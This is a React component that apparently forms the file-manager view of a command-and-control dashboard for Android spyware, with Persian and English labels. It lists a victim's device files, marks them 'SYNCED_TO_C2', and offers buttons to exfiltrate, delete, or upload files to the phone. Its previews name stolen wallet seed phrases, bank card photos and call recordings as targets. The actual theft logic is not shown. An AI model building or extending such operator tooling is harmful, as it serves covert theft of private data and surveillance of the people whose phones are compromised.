import React, { useState } from 'react';
import { useDashboard } from '../../context/DashboardContext';
import { 
  FolderTree, 
  Folder, 
  File, 
  FileText, 
  Image as ImageIcon, 
  Music, 
  Database, 
  Download, 
  Trash2, 
  Upload, 
  Search, 
  CheckCircle,
  Eye,
  ArrowUp
} from 'lucide-react';
import { t } from '../../utils/translations';
import { FileItem } from '../../types';

export const FileManagerView: React.FC = () => {
  const { 
    lang, 
    filesList, 
    selectedDevice, 
    deleteFile, 
    markFileExfiltrated,
    triggerRemoteAction,
    setToastMessage 
  } = useDashboard();

  const labels = t[lang];
  const [currentPath, setCurrentPath] = useState('/sdcard');
  const [searchQuery, setSearchQuery] = useState('');
  const [previewFile, setPreviewFile] = useState<FileItem | null>(null);

  const filteredFiles = filesList.filter(f => {
    return f.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
           f.path.toLowerCase().includes(searchQuery.toLowerCase());
  });

  const getFileIcon = (type: FileItem['type']) => {
    switch (type) {
      case 'folder': return <Folder className="w-4 h-4 text-cyan-400" />;
      case 'image': return <ImageIcon className="w-4 h-4 text-emerald-400" />;
      case 'audio': return <Music className="w-4 h-4 text-amber-400" />;
      case 'database': return <Database className="w-4 h-4 text-rose-400" />;
      case 'document': return <FileText className="w-4 h-4 text-blue-400" />;
      default: return <File className="w-4 h-4 text-slate-400" />;
    }
  };

  return (
    <div className="space-y-6">
      {/* Top Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 border-b border-slate-800/60 pb-4">
        <div>
          <h1 className="text-xl font-bold tracking-tight text-white">
            {labels.navFileManager}
          </h1>
          <p className="text-xs text-slate-400 mt-1">
            {lang === 'fa' 
              ? 'کاوش در فایل‌های حافظه داخلی، عکس‌های بانکی استخراج‌شده، پایگاه‌های داده و ضبط صدا' 
              : 'Android file system explorer, exfiltrated documents, voice notes, and private databases'}
          </p>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => {
              triggerRemoteAction('File Upload dispatched to /sdcard/Download');
              setToastMessage(lang === 'fa' ? 'فایل به حافظه گوشی ارسال شد' : 'File uploaded to endpoint storage');
            }}
            className="flex items-center gap-1.5 px-3 py-1.5 bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-200 text-xs rounded-lg transition-colors cursor-pointer"
          >
            <Upload className="w-3.5 h-3.5 text-cyan-400" />
            <span>{lang === 'fa' ? 'آپلود فایل به گوشی' : 'Upload File to Device'}</span>
          </button>
        </div>
      </div>

      {/* Breadcrumb Path & Search Bar */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-slate-900/40 p-3 rounded-xl border border-slate-800/80">
        <div className="flex items-center gap-2 text-xs font-mono text-slate-300">
          <button 
            onClick={() => setCurrentPath('/sdcard')}
            className="text-slate-400 hover:text-white p-1 rounded transition-colors cursor-pointer"
            title="Root"
          >
            <ArrowUp className="w-3.5 h-3.5" />
          </button>
          <span className="text-cyan-400 font-semibold">{currentPath}</span>
        </div>

        <div className="relative w-full sm:w-64">
          <Search className="w-4 h-4 text-slate-500 absolute start-3 top-1/2 -translate-y-1/2" />
          <input
            type="text"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder={lang === 'fa' ? 'جستجوی نام فایل...' : 'Search filenames...'}
            className="w-full bg-slate-950 border border-slate-800 rounded-lg ps-9 pe-3 py-1.5 text-xs text-slate-200 placeholder-slate-500 outline-none focus:border-cyan-500"
          />
        </div>
      </div>

      {/* Main Files Table */}
      <div className="rounded-xl bg-slate-900/60 border border-slate-800/80 overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-xs text-start">
            <thead>
              <tr className="border-b border-slate-800 bg-slate-950/60 text-slate-400 text-[11px]">
                <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'نام آیتم' : 'File Name'}</th>
                <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'مسیر کامل در اندروید' : 'Path'}</th>
                <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'حجم' : 'Size'}</th>
                <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'آخرین تغییر' : 'Modified'}</th>
                <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'وضعیت استخراج (Exfiltrated)' : 'Status'}</th>
                <th className="py-3 px-4 font-medium text-end">{lang === 'fa' ? 'عملیات' : 'Actions'}</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/50">
              {filteredFiles.map((file) => (
                <tr key={file.id} className="hover:bg-slate-800/25 transition-colors">
                  <td className="py-3 px-4">
                    <div className="flex items-center gap-2.5 font-medium text-slate-200">
                      {getFileIcon(file.type)}
                      <span className="truncate max-w-[220px]">{file.name}</span>
                    </div>
                  </td>

                  <td className="py-3 px-4 font-mono text-slate-400 text-[11px]">
                    {file.path}
                  </td>

                  <td className="py-3 px-4 font-mono tabular-nums text-slate-300">
                    {file.size}
                  </td>

                  <td className="py-3 px-4 font-mono text-slate-400 text-[11px]">
                    {file.modified}
                  </td>

                  <td className="py-3 px-4">
                    {file.exfiltrated ? (
                      <span className="inline-flex items-center gap-1 text-[11px] text-emerald-400 font-mono">
                        <CheckCircle className="w-3.5 h-3.5" />
                        SYNCED_TO_C2
                      </span>
                    ) : (
                      <span className="text-[11px] text-slate-500 font-mono">
                        LOCAL_ONLY
                      </span>
                    )}
                  </td>

                  <td className="py-3 px-4 text-end">
                    <div className="flex items-center justify-end gap-1.5">
                      <button
                        onClick={() => markFileExfiltrated(file.id)}
                        className="p-1.5 rounded-lg bg-slate-800 hover:bg-cyan-900/60 text-slate-300 hover:text-cyan-300 transition-colors cursor-pointer"
                        title={lang === 'fa' ? 'استخراج و دانلود فایل' : 'Exfiltrate & Download'}
                      >
                        <Download className="w-3.5 h-3.5" />
                      </button>

                      <button
                        onClick={() => setPreviewFile(file)}
                        className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 transition-colors cursor-pointer"
                        title={lang === 'fa' ? 'مشاهده پیش‌نمایش' : 'Inspect Preview'}
                      >
                        <Eye className="w-3.5 h-3.5" />
                      </button>

                      <button
                        onClick={() => deleteFile(file.id)}
                        className="p-1.5 rounded-lg bg-slate-800 hover:bg-rose-900/60 text-slate-300 hover:text-rose-300 transition-colors cursor-pointer"
                        title={lang === 'fa' ? 'حذف از گوشی' : 'Delete'}
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Modal File Preview */}
      {previewFile && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-xs">
          <div className="w-full max-w-lg bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-800">
              <div className="flex items-center gap-2">
                {getFileIcon(previewFile.type)}
                <span className="font-semibold text-white text-xs">{previewFile.name}</span>
              </div>
              <button 
                onClick={() => setPreviewFile(null)}
                className="text-slate-400 hover:text-white text-xs cursor-pointer"
              >
                ✕
              </button>
            </div>

            <div className="bg-slate-950 p-4 rounded-lg font-mono text-xs text-slate-300 max-h-60 overflow-y-auto">
              {previewFile.type === 'document' ? (
                <div>
                  [File Contents Preview: {previewFile.name}]<br />
                  ocean velvet whisper galaxy solar puzzle timber drift orbit ...<br />
                  (12-word cryptographic seed phrase for Ethereum wallet)
                </div>
              ) : previewFile.type === 'image' ? (
                <div className="text-center py-6 text-slate-500">
                  <ImageIcon className="w-12 h-12 text-slate-600 mx-auto mb-2" />
                  <span>[Image Header: JPEG 3840x2160 - Bank Card Front Photo]</span>
                </div>
              ) : previewFile.type === 'audio' ? (
                <div className="text-center py-6 text-slate-500">
                  <Music className="w-12 h-12 text-amber-500/60 mx-auto mb-2" />
                  <span>[Audio Waveform: AAC 64kbps - 142s Call Recording Stream]</span>
                </div>
              ) : (
                <div>
                  [Raw Binary Hex Preview]<br />
                  53 51 4c 69 74 65 20 66 6f 72 6d 61 74 20 33 00<br />
                  Encrypted SQLite Database Header
                </div>
              )}
            </div>

            <div className="flex justify-end gap-2">
              <button
                onClick={() => {
                  markFileExfiltrated(previewFile.id);
                  setPreviewFile(null);
                }}
                className="px-3 py-1.5 bg-cyan-600 hover:bg-cyan-500 text-slate-950 font-semibold text-xs rounded-lg transition-colors cursor-pointer"
              >
                {lang === 'fa' ? 'دانلود فایل روی رایانه' : 'Download to Host'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
